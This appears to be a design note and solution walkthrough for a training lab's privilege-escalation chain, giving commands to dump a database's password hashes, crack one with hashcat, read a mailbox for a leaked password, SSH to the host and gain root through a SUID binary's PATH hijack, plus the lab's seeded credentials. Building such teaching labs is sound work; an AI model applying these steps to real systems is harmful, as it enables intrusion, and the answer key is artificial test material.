# Privilege escalation — Stages 4–8 (BUILT)

*This supersedes the original "reserved for the next build" plan. The chain
below is implemented and tested. It no longer uses the `backup` vhost hook —
that vhost stays inert set-dressing.*

The chain: **`www-data` (in the siwang container) → crack a reused password →
read chrysanta's mailbox on the `smtp` container → SSH to `chrysanta` on the
HOST → root on the HOST.**

The endgame deliberately leaves the containers: Stages 7–8 live on the host, so
the "container breakout" is by *credential*, not a runtime escape (see
`UNINTENDED-PATHS.md` §10).

---

## Stage 4 — loot the database (siwang container, as `www-data`)

`www-data` can read `/var/www/dev/includes/config.php` (`0640 root:www-data`),
which holds the app DB password in cleartext, and the `siwang_app` grant is
`SELECT, INSERT, UPDATE ON siwang_dev.*`. So from the Stage 3 shell:

```sh
mysql -h127.0.0.1 -usiwang_app -p'<DB_PASS from config.php>' siwang_dev \
  -e "SELECT username,email,role,password_hash FROM users"
```

The interesting row is **`chrysanta`** / `chrysanta@siwang-trading.example`,
role `user`. Its bcrypt hash is the only crackable one in the table — `mika`
(admin), `emma`, `svc_dms` all have long random passwords by design.

## Stage 5 — crack (attacker box)

```sh
hashcat -m 3200 chrysanta.hash rockyou.txt      # or: john --format=bcrypt
```

The password is **`dylan`** — an early rockyou entry, so bcrypt cost 10 falls in
seconds–minutes. The lesson isn't the crack, it's what it unlocks next
(credential reuse).

## Stage 6 — pivot to the mail host (`smtp` container)

`smtp` (maddy, hostname `mail`) is on the **internal** `labnet` network only —
never published to the host — so it is reachable *only from inside the siwang
container*. Students tunnel through the `www-data` shell (or drop a client onto
the box) and log in over IMAP with the reused password:

```sh
# from inside the siwang container / through the pivot
python3 - <<'PY'
import imaplib
M=imaplib.IMAP4("mail",143)
M.login("chrysanta@siwang-trading.example","dylan")
M.select("INBOX")
print(M.search(None,"BODY","password")[1])   # or read it all and sift
PY
```

The inbox is ~12 ordinary staff emails plus **one** IT "password reset" notice.
It leaks chrysanta's *shell* password on the operations host:

```
login:    chrysanta
password: BenMyG0AT
```

## Stage 7 — SSH to the host

The host has a local user `chrysanta` (created by `install/privesc-host.sh`)
whose password is `BenMyG0AT`, with an sshd drop-in permitting password login
for that one account. Host `:22` is reachable directly (the reused mail
password is the whole point — the pivot was to *read* it):

```sh
ssh chrysanta@<host>          # password: BenMyG0AT
```

## Stage 8 — root on the host (SUID + PATH hijack)

```sh
find / -perm -4000 -type f 2>/dev/null      # -> /usr/local/bin/opsbackup
strings /usr/local/bin/opsbackup            # -> runs "backup-check" by name
mkdir -p ~/bin
printf '#!/bin/bash\n/bin/bash -p\n' > ~/bin/backup-check
chmod +x ~/bin/backup-check
PATH="$HOME/bin:$PATH" /usr/local/bin/opsbackup   # -> root shell
```

`opsbackup` is SUID-root and `execlp("backup-check", …)`s a command by relative
name after `setuid(0)`, trusting `$PATH`. Prepending a writable dir wins root.

---

## Provisioning / teardown

- Containers: `cd defence/docker && docker compose up -d --build` builds both
  `siwang` and `smtp`. The mailbox re-seeds on every mail-container start
  (fresh tmpfs `/data`), matching the lab's reset-between-cohorts model.
- **Host (Stages 7–8):** `sudo defence/install/privesc-host.sh --confirm`.
  This is the *only* part that weakens the host (a password SSH account + a SUID
  binary). It refuses to run without `--confirm`, supports `--dry-run`, and is
  undone by `--uninstall` (also wired into `uninstall.sh --purge`).
- Credentials live in exactly two places and must stay in sync:
  `db/seed_users.php` (`chrysanta`/`dylan`) and `docker/smtp/seed-mail.sh` +
  `install/privesc-host.sh` (`BenMyG0AT`).

## Guardrails preserved

- Stages 1–3 are untouched; `verify.sh` still reports **20/0**.
- Exactly one crackable password (`dylan`), on a **non-admin** account, so it is
  never a shortcut past Stage 2.
- The DB password is not *also* trivially readable somewhere that skips Stage 4.
- Both containers are hardened (`cap_drop`, narrowed cert mount; the mail box
  additionally read-only + `no-new-privileges`). See `UNINTENDED-PATHS.md` §10.
